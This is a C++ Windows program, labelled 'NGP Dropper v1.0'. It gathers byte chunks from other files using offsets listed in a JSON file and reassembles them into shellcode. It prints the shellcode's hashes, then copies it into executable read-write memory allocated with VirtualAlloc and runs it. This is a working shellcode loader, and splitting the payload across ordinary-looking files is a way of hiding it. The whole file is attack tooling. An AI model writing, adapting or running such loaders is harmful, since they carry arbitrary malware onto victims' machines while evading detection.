#include <Windows.h>
#include <bcrypt.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <map>
#include <regex>

#pragma comment(lib, "bcrypt.lib")

void print_hash(const BYTE* hash, DWORD hash_len) {
    for (DWORD i = 0; i < hash_len; i++) {
        printf("%02x", hash[i]);
    }
    printf("\n");
}

bool get_hash(const std::vector<uint8_t>& data, LPCWSTR alg_id, std::vector<BYTE>& hash_out) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    DWORD cbHash = 0, cbData = 0;

    status = BCryptOpenAlgorithmProvider(&hAlg, alg_id, NULL, 0);
    if (status != 0) {
        std::cerr << "BCryptOpenAlgorithmProvider failed: " << status << std::endl;
        return false;
    }

    status = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&cbHash, sizeof(DWORD), &cbData, 0);
    if (status != 0) {
        std::cerr << "BCryptGetProperty failed: " << status << std::endl;
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    hash_out.resize(cbHash);

    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (status != 0) {
        std::cerr << "BCryptCreateHash failed: " << status << std::endl;
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptHashData(hHash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
    if (status != 0) {
        std::cerr << "BCryptHashData failed: " << status << std::endl;
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptFinishHash(hHash, hash_out.data(), cbHash, 0);
    if (status != 0) {
        std::cerr << "BCryptFinishHash failed: " << status << std::endl;
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

struct Chunk {
    int offset = 0;
    int length = 0;
    std::string file;
    std::string chunk;
};

std::vector<std::map<std::string, std::string>> parse_json_array(const std::string& filename) {
    std::ifstream fin(filename);
    if (!fin) {
        std::cerr << "[ERROR] Cannot open the file: " << filename << std::endl;
        return {};
    }
    std::stringstream buffer;
    buffer << fin.rdbuf();
    std::string text = buffer.str();

    text = std::regex_replace(text, std::regex(",\\s*([}\\]])"), "$1");
    text = std::regex_replace(text, std::regex("//.*?$|/\\*.*?\\*/"), "", std::regex_constants::format_default | std::regex_constants::match_any);

    std::vector<std::map<std::string, std::string>> result;
    std::regex obj_re(R"(\{([^}]*)\})");
    auto obj_begin = std::sregex_iterator(text.begin(), text.end(), obj_re);
    auto obj_end = std::sregex_iterator();

    std::regex pair_re(R"("([^\"]+)\"\s*:\s*(\"[^\"]*\"|\d+))");

    for (auto it = obj_begin; it != obj_end; ++it) {
        std::smatch obj_match = *it;
        std::string obj_str = obj_match.str();
        std::map<std::string, std::string> m;

        auto pair_begin = std::sregex_iterator(obj_str.begin(), obj_str.end(), pair_re);
        auto pair_end = std::sregex_iterator();
        for (auto pit = pair_begin; pit != pair_end; ++pit) {
            std::smatch pair_match = *pit;
            std::string key = pair_match[1].str();
            std::string value = pair_match[2].str();
            if (value.size() >= 2 && value.front() == '"' && value.back() == '"')
                value = value.substr(1, value.size() - 2);
            m[key] = value;
        }
        result.push_back(m);
    }
    return result;
}

std::string getFilename(const std::string& path) {
    size_t pos = path.find_last_of('\\');
    if (pos != std::string::npos) {
        return path.substr(pos + 1);
    }
    else {
        return path;
    }
}

std::vector<uint8_t> ReadChunk(const std::string& filepath, int offset, int length) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file) {
        std::cerr << "[ERROR] Cannot open file: " << filepath << std::endl;
        return {};
    }
    file.seekg(offset, std::ios::beg);
    if (!file) {
        std::cerr << "[ERROR] Failed to seek in file: " << filepath << std::endl;
        return {};
    }
    std::vector<uint8_t> buffer(length);
    file.read(reinterpret_cast<char*>(buffer.data()), length);
    if (file.gcount() != length) {
        std::cerr << "[ERROR] Could not read enough bytes from file: " << filepath << std::endl;
        return {};
    }
    return buffer;
}

int main(int argc, char** argv)
{
    if (argc != 2) {
        std::cout << "Usage: \"NGP Dropper.exe\" [NGP JSON FILE]" << std::endl;
    }
    else {
        std::cout << "[INFO] NGP Dropper v1.0" << std::endl;

        std::string target = argv[1];
        std::cout << "[INFO] NGP JSON FILE: [" << target << "]" << std::endl;

        printf("\n\n**************************************************************************\n");

        auto metadata = parse_json_array(target);

        size_t total_size = 0;
        std::vector<uint8_t> shellcode;

        for (const auto& data : metadata) {
            Chunk chunk;
            if (data.count("offset")) chunk.offset = std::stoi(data.at("offset"));
            if (data.count("length")) chunk.length = std::stoi(data.at("length"));
            if (data.count("file")) chunk.file = data.at("file");
            if (data.count("chunk")) chunk.chunk = data.at("chunk");

            total_size += std::stoi(data.at("length"));

            std::string filename = chunk.file.substr(chunk.file.find_last_of("/\\") + 1);

            printf("[INFO] Loading %d bytes from %s at %d\n", chunk.length, filename.c_str(), chunk.offset);

            auto data_bytes = ReadChunk(chunk.file, chunk.offset, chunk.length);
            shellcode.insert(shellcode.end(), data_bytes.begin(), data_bytes.end());
        }

        printf("\n\n**************************************************************************\n");
        printf("[INFO] Expected shellcode size: %zu bytes\n", total_size);
        printf("[INFO] Loaded shellcode size: %zu bytes\n", shellcode.size());
        
        if (total_size != shellcode.size()) {
            printf("[ERROR] Shellcode size mismatch detected! Aborting...\n");
            return 1;
        }
        printf("[INFO] Shellcode size verification successful.\n");

        printf("\n\n**************************************************************************\n");

        printf("[INFO] Shellcode Hashes:\n");
        std::vector<BYTE> md5_hash, sha1_hash, sha256_hash;

        if (get_hash(shellcode, BCRYPT_MD5_ALGORITHM, md5_hash)) {
            std::cout << " * MD5:    "; print_hash(md5_hash.data(), (DWORD)md5_hash.size());
        }

        if (get_hash(shellcode, BCRYPT_SHA1_ALGORITHM, sha1_hash)) {
            std::cout << " * SHA1:   "; print_hash(sha1_hash.data(), (DWORD)sha1_hash.size());
        }

        if (get_hash(shellcode, BCRYPT_SHA256_ALGORITHM, sha256_hash)) {
            std::cout << " * SHA256: "; print_hash(sha256_hash.data(), (DWORD)sha256_hash.size());
        }

        printf("\n\n**************************************************************************\n");
        printf("[INFO] Initiating shellcode injection process...\n");

        char choice;
        printf("[PROMPT] Execute shellcode? (Y/n): ");
        std::cin >> choice;

        if (choice != 'Y' && choice != 'y') {
            printf("[INFO] Execution aborted by user.\n");
            return 0;
        }

        LPVOID memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!memory) {
            printf("[ERROR] VirtualAlloc failed: %lu\n", GetLastError());
            return 1;
        }

        memcpy(memory, shellcode.data(), shellcode.size());

        printf("[INFO] Shellcode copied to memory. Executing...\n");
        void (*shell)() = (void(*)())memory;

        printf("\n\n**************************************************************************\n");
        printf("[INFO] Executing...\n");

        shell();

        VirtualFree(memory, 0, MEM_RELEASE);
    }
}